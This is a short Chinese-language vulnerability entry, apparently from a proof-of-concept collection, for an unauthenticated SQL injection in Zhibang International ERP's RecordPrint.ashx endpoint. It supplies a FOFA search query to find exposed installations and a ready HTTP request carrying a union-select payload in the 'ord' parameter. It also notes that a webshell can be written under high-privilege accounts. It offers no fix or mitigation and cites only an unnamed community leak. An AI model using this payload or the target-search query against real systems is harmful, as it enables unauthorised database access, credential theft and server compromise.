## 智邦国际 ERP RecordPrint.ashx SQL 注入漏洞

## 漏洞描述
智邦国际 ERP 的 `RecordPrint.ashx` 接口在处理 `ord` 参数时直接拼接 SQL，攻击者无需登录即可注入恶意语句，获取数据库敏感信息甚至写入后门。

## 网络空间测绘
```
fofa: app="智邦国际-企业管理软件"
```

## POC
```
GET /SYSN/json/pcclient/RecordPrint.ashx?sort=1&ord=-1'%20union%20select%20@@version-- HTTP/1.1
Host: <target domain>
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.712.36 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```
若响应中返回 SQL Server 版本字符串，则说明存在注入。

## 风险
- 数据库账号密码泄露
- 在高权限账户下可进一步写入 Webshell

## 参考
- 社区爆料

